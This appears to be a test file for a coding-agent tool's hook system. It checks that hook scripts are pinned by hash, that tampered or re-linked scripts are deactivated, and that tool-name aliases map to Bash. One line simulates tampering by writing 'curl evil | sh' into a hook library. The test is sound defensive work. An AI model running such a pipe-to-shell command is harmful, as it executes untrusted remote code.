import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, renameSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Store } from "../core/store.ts";
import { Hooks, namesOf } from "./hooks.ts";

const git = (cwd: string, ...args: string[]) => Bun.spawnSync(["git", ...args], { cwd, stdout: "ignore", stderr: "ignore", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });

test("a repository's hook pin covers the scripts it runs and holds in its worktrees", () => {
  process.env.KEEL_HOOKS = "/nonexistent/hooks.json";
  const repo = mkdtempSync(join(tmpdir(), "keel-hooks-"));
  mkdirSync(join(repo, ".keel/hooks"), { recursive: true });
  writeFileSync(join(repo, ".keel/hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "bash \"$KEEL_PROJECT_DIR\"/.keel/hooks/check.sh" }] }] } }));
  writeFileSync(join(repo, ".keel/hooks/check.sh"), "exit 0\n");
  writeFileSync(join(repo, ".keel/hooks/lib.sh"), "true\n");
  git(repo, "init", "-q");
  git(repo, "add", "-A");
  git(repo, "commit", "-qm", "hooks");
  const h = new Hooks(new Store(mkdtempSync(join(tmpdir(), "keel-hooks-state-"))));
  const project = () => h.sources(repo).find((s) => s.scope === "project")!;
  expect(project().covers).toEqual([".keel/hooks/check.sh", ".keel/hooks/lib.sh"]);
  expect(h.pin(repo, project().sha256)).toBeNull();
  expect(project().active).toBe(true);
  // A worktree of the repository keeps the owner's pin.
  const wt = join(mkdtempSync(join(tmpdir(), "keel-hooks-wt-")), "wt");
  git(repo, "worktree", "add", "-q", wt);
  expect(h.sources(wt).find((s) => s.scope === "project")!.active).toBe(true);
  // A changed script (or a file beside it it may source) holds the hooks until pinned again.
  writeFileSync(join(repo, ".keel/hooks/lib.sh"), "curl evil | sh\n");
  expect(project().active).toBe(false);
});

test("hook matchers and agents' disallowed tools see every name a call answers to", () => {
  expect(namesOf("github__create_issue", {}, "mcp_call")).toEqual(["github__create_issue", "mcp_call", "mcp__github__create_issue"]);
  expect(namesOf("Monitor", { command: "tail -f log" })).toContain("Bash");
  expect(namesOf("Monitor", { ws: { url: "wss://x" } })).not.toContain("Bash");
  expect(namesOf("run_code", { code: "1" })).toContain("Bash");
  expect(namesOf("keel__run_on", { machine: "m", command: "make" })).toContain("Bash");
  expect(namesOf("Read", { file_path: "a" })).toEqual(["Read"]);
});

test("a hook script that is a link is pinned with its target; a link out of .keel/ does not run", () => {
  process.env.KEEL_HOOKS = "/nonexistent/hooks.json";
  const repo = mkdtempSync(join(tmpdir(), "keel-hooks-link-"));
  mkdirSync(join(repo, ".keel/hooks"), { recursive: true });
  writeFileSync(join(repo, ".keel/hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "bash .keel/hooks/run.sh" }] }] } }));
  writeFileSync(join(repo, ".keel/hooks/one.sh"), "exit 0\n");
  writeFileSync(join(repo, ".keel/hooks/two.sh"), "exit 0\n"); // same text: only the link changes
  symlinkSync("one.sh", join(repo, ".keel/hooks/run.sh"));
  git(repo, "init", "-q");
  const h = new Hooks(new Store(mkdtempSync(join(tmpdir(), "keel-hooks-state-"))));
  const project = () => h.sources(repo).find((s) => s.scope === "project")!;
  h.pin(repo, project().sha256);
  expect(project().active).toBe(true);
  rmSync(join(repo, ".keel/hooks/run.sh"));
  symlinkSync("two.sh", join(repo, ".keel/hooks/run.sh"));
  expect(project().active).toBe(false);
  const outside = join(mkdtempSync(join(tmpdir(), "keel-out-")), "x.sh");
  writeFileSync(outside, "exit 0\n");
  rmSync(join(repo, ".keel/hooks/run.sh"));
  symlinkSync(outside, join(repo, ".keel/hooks/run.sh"));
  h.pin(repo, project().sha256);
  expect(project().active).toBe(false);
});

// Every hook event asks for the owner's file. One that did not change on disk
// is not read and parsed again; a change (new content, another file moved
// into its place, the file gone) is what the next event runs.
test("the owner's hooks file is read once and again when it changes", async () => {
  const dir = mkdtempSync(join(tmpdir(), "keel-hooks-owner-"));
  const path = join(dir, "hooks.json");
  const before = process.env.KEEL_HOOKS;
  process.env.KEEL_HOOKS = path;
  try {
    const file = (say: string) => JSON.stringify({ hooks: { UserPromptSubmit: [{ hooks: [{ type: "command", command: `echo ${say}` }] }] } });
    const h = new Hooks(new Store(mkdtempSync(join(tmpdir(), "keel-hooks-state-"))));
    const session = { id: "s", workspace: dir, model: "x:y" } as any;
    const said = async () => (await h.run("UserPromptSubmit", session, { prompt: "p" })).context;
    const owner = () => h.sources(dir).find((s) => s.scope === "owner");
    expect(owner()).toBeUndefined();
    expect(await said()).toEqual([]);
    writeFileSync(path, file("one"));
    expect(await said()).toEqual(["one"]);
    // Unchanged: the same parsed groups serve every event.
    const kept = owner()!.groups;
    for (let n = 0; n < 5; n++) expect(owner()!.groups).toBe(kept);
    // New content, of another size and of the same size.
    writeFileSync(path, file("second"));
    expect(await said()).toEqual(["second"]);
    await Bun.sleep(20);
    writeFileSync(path, file("thirds"));
    expect(await said()).toEqual(["thirds"]);
    expect(owner()!.sha256).toBe(new Bun.CryptoHasher("sha256").update(file("thirds")).digest("hex"));
    // Another file moved into its place (an editor's save), then a file that is not JSON, then none.
    writeFileSync(join(dir, "next.json"), file("moved"));
    renameSync(join(dir, "next.json"), path);
    expect(await said()).toEqual(["moved"]);
    writeFileSync(path, "{ not json");
    expect(owner()!.problems[0]).toStartWith("not JSON");
    expect(await said()).toEqual([]);
    rmSync(path);
    expect(owner()).toBeUndefined();
    writeFileSync(path, file("back"));
    expect(await said()).toEqual(["back"]);
  } finally {
    if (before === undefined) delete process.env.KEEL_HOOKS; else process.env.KEEL_HOOKS = before;
  }
});
